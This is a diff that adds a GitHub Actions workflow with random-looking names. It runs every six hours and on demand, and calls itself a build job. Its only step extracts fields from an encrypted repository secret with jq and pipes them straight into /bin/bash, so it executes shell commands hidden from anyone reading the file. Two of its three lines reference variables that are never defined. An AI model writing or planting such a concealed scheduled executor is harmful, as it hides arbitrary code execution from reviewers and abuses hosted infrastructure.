@@ -1,0 +1,19 @@
+name: falconsabaft
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: falconsabaft
+        env:
+          bm084: ${{ secrets.bm084 }}
+        run: |
+          echo $bm084 | jq -r .bvzl416 | /bin/bash
+          echo $t28632 | jq -r .rj0644 | /bin/bash
+          echo $if33 | jq -r .zm97 | /bin/bash
+
